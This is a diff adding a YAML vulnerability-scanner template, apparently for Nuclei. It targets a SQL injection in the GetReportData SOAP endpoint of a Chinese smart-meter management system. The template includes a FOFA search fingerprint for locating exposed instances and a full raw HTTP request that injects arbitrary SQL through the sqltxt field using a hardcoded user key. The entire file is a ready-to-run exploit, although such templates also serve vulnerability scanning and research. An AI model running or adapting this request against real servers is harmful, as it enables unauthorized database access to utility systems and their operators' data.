@@ -1,0 +1,19 @@
+id: poc-ndu931dubtc05g7i
+info:
+  name: 智能表综合管理系统GetReportData存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ndu931dubtc05g7i'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ndu931dubtc05g7i
+    fofa: body="headerTableWrap"
+http:
+- raw:
+  - "POST /SunReportService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1536.125 Safari/537.36\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://suntront.com/GetReportData \"\nContent-Length: 400\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetReportData xmlns=\"http://suntront.com/\">\n      <sqltxt>select @@version</sqltxt>\n      <Userkey>XTSunReport</Userkey>\n    </GetReportData>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
